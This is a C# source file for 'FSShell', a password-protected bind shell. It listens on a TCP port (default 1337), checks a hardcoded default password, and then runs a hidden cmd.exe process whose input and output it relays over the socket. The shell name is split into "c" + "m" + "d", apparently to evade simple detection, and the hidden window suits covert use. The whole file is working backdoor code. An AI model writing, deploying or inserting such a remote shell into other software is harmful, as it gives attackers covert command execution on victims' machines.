using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;
using System.Text;

namespace FSShellCore
{
	public class Shell
	{
		private TcpListener listener;
		private Socket mainSocket;
		private int _port;
		private String _name;
		private String _password;
		private bool _verbose = true; 
		private Process shell;
		private StreamReader fromShell;
		private StreamWriter toShell;
		private StreamReader inStream;
		private StreamWriter outStream;
		private Thread shellThread;

		private const int default_port = 1337;
		private const String default_user = "FSServer";
		private const String default_password = "xxxxxxxx";


		public Shell()
		{
			_port = default_port;
			_name = default_user;
			_password = default_password;
		}

		public Shell(int port)
		{
			_port = port;
			_name = default_user;
			_password = default_password;
		}

		public Shell(int port, String name, String password)
		{
			_port = port;
			_name = name;
			_password = password;
		}

		public Shell(int port, String name, String password, bool verbose)
		{
			_port = port;
			_name = name;
			_password = password;
			_verbose = verbose;
		}

		public bool Verbose
		{
			get { return _verbose; }
			set { _verbose = value; }
		}

		public void Start()
		{
			try
			{
				Thread shell = new Thread(StartServer);
				shell.Start();
			}
			catch (Exception) { }
		}


		void StartServer()
		{
			try
			{
				while (true)
				{
					if (_verbose)
						Console.WriteLine("Listening on port " + _port);

					IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
					listener = new TcpListener(ipAddress, _port);
					listener.Start();
					mainSocket = listener.AcceptSocket();

					using (Stream s = new NetworkStream(mainSocket))
					{
						using (inStream = new StreamReader(s, Encoding.GetEncoding("ISO-8859-1")))
						{
							using (outStream = new StreamWriter(s, Encoding.GetEncoding("ISO-8859-1")))
							{
								outStream.AutoFlush = true;

								outStream.WriteLine("FSShell v1.0");

								if (_verbose)
									Console.WriteLine("Client connected: " + mainSocket.RemoteEndPoint);

								outStream.Write("Password: ");

								String checkPass = inStream.ReadLine();

								if (_verbose)
									Console.WriteLine("Client tried password " + checkPass);

								if (!checkPass.Equals(_password))
								{
									outStream.WriteLine("Incorrect Password.");

									if (_verbose)
										Console.WriteLine("Incorrect Password.");
									badPass();
								}
								else
								{

									if (_verbose)
										Console.WriteLine("Password Accepted.");

									outStream.WriteLine("Password Accepted.");

									shell = new Process();

									ProcessStartInfo p = new ProcessStartInfo("c" + "m" + "d");

									p.CreateNoWindow = true;
									p.UseShellExecute = false;
									p.RedirectStandardError = true;
									p.RedirectStandardInput = true;
									p.RedirectStandardOutput = true;

									p.StandardOutputEncoding = Encoding.GetEncoding("ISO-8859-1");
									p.StandardErrorEncoding = Encoding.GetEncoding("ISO-8859-1");

									shell.StartInfo = p;
									shell.Start();

									fromShell = shell.StandardOutput;
									toShell = shell.StandardInput;
									toShell.AutoFlush = true;

									shellThread = new Thread(new ThreadStart(getShellInput));
									shellThread.Start();
									outStream.WriteLine("Bienvenido al servidor: " + _name + ".");
									outStream.WriteLine("Starting shell...\n");

									handleCommand("");

									getInput();
									dropConnection();
								}
							}
						}
					}
				}
			}
			catch (Exception) { dropConnection(); }
		}

        void getShellInput()
		{
			try
			{
				String tempBuf = "";
				while ((tempBuf = fromShell.ReadLine()) != null)
				{
					outStream.Write("\r\n" + tempBuf);
				}
				dropConnection();
			}
			catch (Exception) {}
		}

		private void getInput() {
			try {
				String tempBuff = "";
				while (((tempBuff = inStream.ReadLine()) != null)) {
					if(_verbose)
						Console.WriteLine("Comando recibido: " + tempBuff);
					handleCommand(tempBuff);
				}
			}
			catch(Exception) {}
		}

		private void handleCommand(String command) {
			try {

				if(command.ToLower().Equals("exit")) {
					outStream.WriteLine("\n\nCerrando la consola...");
					dropConnection();
				}
				toShell.Write(command + "\r\n");
				toShell.Write("\r\n");
			}
			catch(Exception) { dropConnection(); }
		}

		private void badPass()
		{
			inStream.Dispose();
			outStream.Dispose();
			mainSocket.Close();
			listener.Stop();
			return;
		}
		private void dropConnection() {
			try {
				if(_verbose)
					Console.WriteLine("Cancelando conexión...");
				shell.Close();
				shell.Dispose();
				//if(shellThread != null)
				//	shellThread.Abort();
				shellThread = null;
				inStream.Dispose();
				outStream.Dispose();
				toShell.Dispose();
				fromShell.Dispose();
				shell.Dispose();
				mainSocket.Close();
				listener.Stop();
				return;
			}
			catch(Exception) {}
		}
	}
}